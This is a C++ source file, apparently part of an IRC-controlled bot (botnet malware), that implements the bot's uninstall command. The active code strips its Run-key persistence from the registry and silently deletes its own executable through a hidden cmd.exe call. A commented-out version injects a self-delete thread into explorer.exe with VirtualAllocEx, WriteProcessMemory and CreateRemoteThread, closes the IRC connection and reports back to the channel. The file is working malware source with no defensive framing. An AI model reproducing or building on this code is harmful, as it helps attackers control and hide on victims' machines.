#include "../IRC.hpp"
#include "../../Core/core.hpp"

/*struct InUninstall {
	API::zDeleteFile	DeleteFile;
	API::zSleep			Sleep;
	API::zSetFileAttributes SetFileAttributes;
	char file[MAX_PATH];
};

DWORD __stdcall UninstallThread( InUninstall *uninstaller ) {
	uninstaller->Sleep(10000);
	uninstaller->SetFileAttributesA(uninstaller->file, 0x00000080);
	uninstaller->DeleteFile(uninstaller->file);
	return 0;
}

void __declspec() UninstallThread_End() {}

void InjectUninstaller( API *api, string path ) {
	LPVOID pAddr = NULL, strAddr = NULL;
	DWORD size = 0, size1 = 0, pid;
	HANDLE proc;

	InUninstall uninstaller;
	api->wsprintf(uninstaller.file, "%s", path.c_str());
	uninstaller.DeleteFile = api->DeleteFileA;
	uninstaller.Sleep      = api->Sleep;
	uninstaller.SetFileAttributesA = api->SetFileAttributesA;

	ActivateSeDebugPrivilege(api);	
	pid = GetPID(api, "explorer.exe");
	proc = api->OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);	
	strAddr = api->VirtualAllocEx(proc, 0, sizeof(InUninstall), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	api->WriteProcessMemory(proc, strAddr, &uninstaller, sizeof(InUninstall), &size1);
	size = (DWORD)UninstallThread_End - (DWORD)UninstallThread;
	pAddr = api->VirtualAllocEx(proc, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	api->WriteProcessMemory(proc, pAddr, (LPVOID)UninstallThread, size, &size1);
	api->CreateRemoteThread(proc, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddr, strAddr, NULL, NULL);	
}*/


int IRC::CMDUninstall( bool update ) {
	HKEY hKey1;
	
	api->persist = false;
	Sleep(500);
	if (api->RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hKey1) == ERROR_SUCCESS) {
		api->RegDeleteValue(hKey1, api->regrunkey.c_str());
		api->RegCloseKey(hKey1);
	}
	if (api->RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hKey1) == ERROR_SUCCESS) {
		api->RegDeleteValue(hKey1, api->regrunkey.c_str());
		api->RegCloseKey(hKey1);
	}

	/* FIX THIS */
	/*api->RegDeleteKey(HKEY_CURRENT_USER, api->magic(api->magic(api->magic(REG_DIR))).c_str());
	api->RegDeleteKey(HKEY_LOCAL_MACHINE, api->magic(api->magic(api->magic(REG_DIR))).c_str());*/

	char movetopath[MAX_PATH];
	char cmdexe[MAX_PATH];
	char command[MAX_PATH];
		
	/*ExpandEnvironmentStrings("%appdata%", movetopath, MAX_PATH);
	lstrcat(movetopath, "\\");
	lstrcat(movetopath, api->thisfile.c_str());*/

	lstrcpy(movetopath, api->thisfile.c_str());
	
	ExpandEnvironmentStrings("%windir%", cmdexe, sizeof(cmdexe));
	strcat(cmdexe, "\\system32\\cmd.exe");
	sprintf(command, "/c ping 0 & del \"%s\" > NUL", movetopath);
	SetFileAttributes(movetopath, FILE_ATTRIBUTE_NORMAL);
	api->ShellExecuteA(0, 0, cmdexe, command, 0, SW_HIDE);

	char *key = (char*)malloc(MAX_PATH);
	RetrieveSetting(CFG_RET, key);
	api->RegCreateKey(HKEY_CURRENT_USER, key, &hKey1);
	free(key);

	return 1;
}

/*int IRC::CMDUninstall( bool update ) {
	HKEY hKey1;
	api->RegCreateKey(HKEY_CURRENT_USER, api->magic(api->magic(api->magic(REG_RET))).c_str(), &hKey1);
	api->RegCloseKey(hKey1);
	api->persist = false;
	Sleep(500);
	if (api->RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hKey1) == ERROR_SUCCESS) {
		api->RegDeleteValue(hKey1, api->regrunkey.c_str());
		api->RegCloseKey(hKey1);
	}
	if (api->RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hKey1) == ERROR_SUCCESS) {
		api->RegDeleteValue(hKey1, api->regrunkey.c_str());
		api->RegCloseKey(hKey1);
	}
	api->RegDeleteKey(HKEY_CURRENT_USER, api->magic(api->magic(api->magic(REG_DIR))).c_str());
	api->RegDeleteKey(HKEY_LOCAL_MACHINE, api->magic(api->magic(api->magic(REG_DIR))).c_str());
	InjectUninstaller(api, api->thisfile);
	if (!update)
		IRCSend(IRC_MSG, servers[currserver].channel, MSG_UN_GENERIC);
	globstatus = CODE_QUIT;
	api->closesocket(ircsock);
	return CODE_QUIT;
}
*/